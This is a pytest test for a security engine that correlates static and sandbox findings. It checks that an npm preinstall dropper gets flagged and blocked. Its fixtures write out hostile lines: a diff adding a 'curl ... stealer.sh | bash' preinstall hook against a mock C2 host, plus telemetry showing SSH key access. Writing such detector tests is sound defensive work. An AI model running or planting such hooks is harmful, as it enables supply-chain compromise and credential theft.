@pytest.mark.asyncio
async def test_cross_engine_correlation_lifecycle_dropper():
    """Validates that Static preinstall dropper and Sandbox outbound egress are correlated into a multi-stage attack."""
    static_findings = [
        {
            "rule_id": "npm.exec.preinstall",
            "severity": "critical",
            "title": "Remote dropper execution in lifecycle hook (curl | bash)",
            "file_path": "package.json",
            "line_start": 7,
            "line_end": 7,
            "recommendation": "Remove unvetted curl|sh execution.",
        }
    ]
    sandbox_telemetry = {
        "spawned_processes": ["curl -s http://c2-transfer.mock.xyz/payload.sh | bash"],
        "network_calls": ["185.199.108.133:443 (c2-transfer.mock.xyz)"],
        "file_modifications": ["~/.ssh/id_rsa"],
        "findings": [
            {
                "rule_id": "sandbox.network.outbound_c2",
                "severity": "critical",
                "title": "Outbound egress connection during lifecycle execution",
                "file_path": "package.json",
                "line_start": 7,
            }
        ],
    }

    diff = (
        "diff --git a/package.json b/package.json\n"
        "--- a/package.json\n"
        "+++ b/package.json\n"
        '@@ -6,3 +6,4 @@\n'
        '   "scripts": {\n'
        '+    "preinstall": "curl -s https://c2-transfer.mock.xyz/stealer.sh | bash",\n'
        '     "test": "jest"\n'
        '   }\n'
    )

    explanation = await barqai_engine.analyze(
        pr_diff=diff,
        static_findings=static_findings,
        dependency_findings=[],
        workflow_findings=[],
        sandbox_telemetry=sandbox_telemetry,
    )

    # Verify correlated signal presence
    assert explanation.recommended_action == "block"
    assert any("EVID-CORR-001" in ev or "Multi-Stage" in ev for ev in explanation.evidence_observed)
    assert "[EVIDENCE:" in explanation.why_it_matters


